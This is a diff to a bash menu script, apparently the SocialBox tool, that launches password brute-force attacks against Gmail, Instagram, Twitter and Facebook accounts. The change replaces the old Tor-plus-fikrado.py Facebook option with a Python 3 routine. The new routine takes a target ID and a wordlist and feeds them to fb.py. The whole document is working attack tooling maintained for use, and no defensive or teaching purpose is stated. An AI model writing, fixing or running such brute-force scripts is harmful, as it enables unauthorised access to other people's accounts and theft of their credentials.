@@ -41,7 +41,7 @@ echo -e "		$Cyan 2 : Brute Force Gmail Account$nc"
 echo -e "		$Cyan 3 : Brute Force Instagram Account 1$nc"
 echo -e "		$Cyan 4 : Brute Force Twitter Account$nc"
 echo -e "		$Cyan 5 : Brute Force Instagram Account 2 $nc"
-echo -e "		$Cyan 6 : Brute Force Facebook Account 2$nc"
+echo -e "		$Cyan 6 : Brute Force Facebook Account 2 (Python 3)$nc"
 echo -e "		$Cyan 7 : Brute Force Instagram Account 3 (igbf - modern)$nc"
 echo -e "		$Cyan 8 : Modern All-in-One (sosec - Instagram/Facebook/Gmail/Twitter)$nc"
 echo -e "		$Cyan 99: Exit$nc"
@@ -174,29 +174,27 @@ else
 exit 1
 fi
 elif [ $ch = 6 ]; then
-echo -e "			$Cyan facebook Brute Force 2$nc"
-cd fikrado.py
-sleep 0.025
-        echo -e "	[+]$red Service Tor Started $nc[+]"
-sleep 0.9
-sv tor start
-echo -e "$yellow Warning: fikrado.py requires Python 2 (not available in modern Termux). Trying python3...$nc"
-python3 fikrado.py 2>/dev/null || echo -e "$red Error: fikrado.py is not Python 3 compatible. Install python2 from external repo or skip this option.$nc"
-echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
-sv tor stop
-echo -e "		[+]$red Service Tor Stopped$nc [+]"
-echo -e "$red"
-read -p "Wanna Back To Main Menu [ Y / n ] : " check5
+echo -e "			$Cyan Facebook Brute Force 2 (Python 3)$nc"
+echo -e "$green"
+read -p "Enter Facebook ID / Email / Username: " id
+read -p "Enter wordlist path : " wordlist
 echo -e "$nc"
-if [ $check5 = "Y" ]; then
+cd facebook-bf
+cp "$wordlist" passwords.txt
+echo "$id" | python3 fb.py 2>/dev/null
+echo -e "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
+echo -e "$red"
+read -p "Wanna Back To Main Menu [ Y / n ] : " check6
+echo -e "$nc"
+if [ $check6 = "Y" ]; then
 cd .. && bash SocialBox.sh
-elif [ $check5 = "y" ]; then
+elif [ $check6 = "y" ]; then
 cd .. && bash SocialBox.sh
-elif [ $check5 = "Yes" ]; then
+elif [ $check6 = "Yes" ]; then
 cd .. && bash SocialBox.sh
-elif [ $check5 = "yes" ]; then
+elif [ $check6 = "yes" ]; then
 cd .. && bash SocialBox.sh
-elif [ $check5 = "YES" ]; then
+elif [ $check6 = "YES" ]; then
 cd .. && bash SocialBox.sh
 else
 exit 1
